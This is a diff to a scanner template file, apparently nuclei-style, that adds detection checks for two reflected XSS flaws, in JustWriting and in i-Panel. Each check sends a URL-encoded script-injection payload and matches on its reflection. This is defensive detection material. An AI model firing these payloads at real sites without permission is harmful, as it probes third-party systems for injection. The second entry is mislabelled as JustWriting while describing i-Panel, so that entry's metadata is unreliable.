@@ -35938,6 +35938,57 @@
       ]
     },
     {
+      "id": "CVE-2021-41467",
+      "info": {
+        "author": "madrobot",
+        "classification": {
+          "cve-id": "CVE-2021-41467",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Cross-site scripting (XSS) vulnerability in application/controllers/dropbox.php in JustWriting 1.0.0 and below allow remote attackers to inject arbitrary web script or HTML via the challenge parameter.",
+        "name": "JustWriting  -  Reflected XSS",
+        "reference": [
+          "https://github.com/hjue/JustWriting/issues/106",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41467"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,justwriting,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/sync/dropbox/download?challenge=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-41648",
       "info": {
         "author": "daffainfo",
@@ -36103,6 +36154,57 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/auth/logout?continue=//example.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-41878",
+      "info": {
+        "author": "madrobot",
+        "classification": {
+          "cve-id": "CVE-2021-41878",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "A reflected cross-site scripting (XSS) vulnerability exists in the i-Panel Administration System Version 2.0 that enables a remote attacker to execute arbitrary JavaScript code in the browser-based web console.",
+        "name": "JustWriting - Reflected XSS",
+        "reference": [
+          "https://cybergroot.com/cve_submission/2021-1/XSS_i-Panel_2.0.html",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41878"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,justwriting,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
